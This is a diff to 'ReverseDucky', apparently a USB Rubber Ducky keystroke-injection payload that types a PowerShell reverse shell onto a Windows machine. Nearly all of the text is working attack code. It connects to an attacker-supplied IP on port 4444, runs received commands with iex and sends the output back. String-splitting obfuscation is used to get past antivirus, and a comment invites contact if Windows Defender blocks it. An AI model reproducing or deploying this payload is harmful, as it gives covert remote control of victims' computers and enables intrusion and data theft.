@@ -1,9 +1,9 @@
 REM       ReverseDucky
-REM       Version 1.1
+REM       Version 1.2
 REM       OS: Windows / Linux(?) (Not tested with Powershell on Linux)
 REM       Author: 0iphor13
 
-REM       Reverse shell executed in the background
+REM       Reverse shell executed in the background - If blocked by Windows Defender, please contact me.
 REM       Fill in Attacker IP & Port in line 18
 REM       DON'T FORGET TO START LISTENER
 
@@ -15,14 +15,12 @@ DELAY 250
 ENTER
 
 DELAY 200
-STRING $I='0.0.0.0';$P=4444;$0LVhbQ=  [TyPE]('tExT'+'.enCOD'+'InG') ; $C=.('New'+'-Obj'+'ect') System.Net.Sockets.TCPCl
+STRING $I='0.0.0.0';$P=4444;$0LVhbQ=[TyPE]('tExT'+'.enCOD'+'InG');$C=.('New'+'-Obj'+'ect') System.Net.Sockets.TCPClient($
 DELAY 200
-STRING ient($I,$P);$S=$C.GetStream();[byte[]]$b=0..65535|&('%'){0};while(($i=$S.Read($b, 0, $b.Length)) -n
+STRING I,$P);$S=$C.GetStream();[byte[]]$b=0..65535|&('%'){0};while(($i=$S.Read($b,0,$b.Length))-ne 0){;$d=(&('New'+'-Ob'+'ject'
 DELAY 200
-STRING e 0){;$d=(&('New'+'-Ob'+'ject') -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb=(&('ie'+'x') $d 2>&1 | .
+STRING ) -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$X=(&('ie'+'x') $d 2>&1 | .('Out'+'-St'+'ring'));$Z=$X+'PS'+(&
 DELAY 200
-STRING ('Out'+'-St'+'ring') );$sb2=$sb+'PS '+(&('pw'+'d')).Path + '> ';$sbt=( $0lvHBq::ASCII).GetBytes($sb2);$S.Write($sbt,0,
-DELAY 200
-STRING $sbt.Length);$S.Flush()};$C.Close()
+STRING ('pw'+'d')).Path+'>';$sbt=($0lvHBq::ASCII).GetBytes($Z);$S.Write($sbt,0,$sbt.Length);$S.Flush()};$C.Close()
 DELAY 100
 ENTER
